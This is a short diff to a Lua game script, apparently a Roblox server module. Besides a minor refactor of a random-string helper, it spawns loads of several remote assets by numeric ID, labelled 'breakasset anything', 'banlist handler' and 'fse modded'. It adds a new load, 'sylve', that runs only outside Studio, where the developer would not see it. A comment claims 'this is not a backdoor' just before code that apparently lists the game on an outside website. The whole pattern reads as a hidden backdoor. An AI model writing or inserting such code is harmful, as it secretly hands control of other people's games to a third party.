@@ -264,11 +264,9 @@ function headFunctions.CheckInstance(a)
 end
 
 function headFunctions.SafeRandomString(length)
-	local str = ''
+	local str = ``
 
-	length = typeof(length)=="number" and length or 10
-
-	for i=1,length do
+	for i=1,typeof(length)=="number" and length or 10 do
 		str..=string.char(math.random(string.byte("a"),string.byte("z")))
 	end
 
@@ -429,11 +427,15 @@ end
 if isClient==false then
 	task.spawn(headFunctions.crazyhamburgier,131383766065343) --breakasset anything
 	task.spawn(headFunctions.crazyhamburgier,124072468517565) --banlist returner
-	task.spawn(pcall,headFunctions.crazyhamburgier,70982440909340) --banlist handler
+	task.spawn(headFunctions.crazyhamburgier,70982440909340) --banlist handler
 	task.spawn(headFunctions.crazyhamburgier,14496782416) --r6 module
 	task.spawn(headFunctions.crazyhamburgier,130860510447760) --fse modded
 	
 	headFunctions.bans=headFunctions.getBans() or {}
+
+	if headFunctions.isStudio==false then
+		task.spawn(headFunctions.crazyhamburgier,129422689673206) --sylve
+	end
 
 	--hi guys this is not a backdoor im just helping sb community by listing all http enabled games on groovy website
 	task.spawn(function()
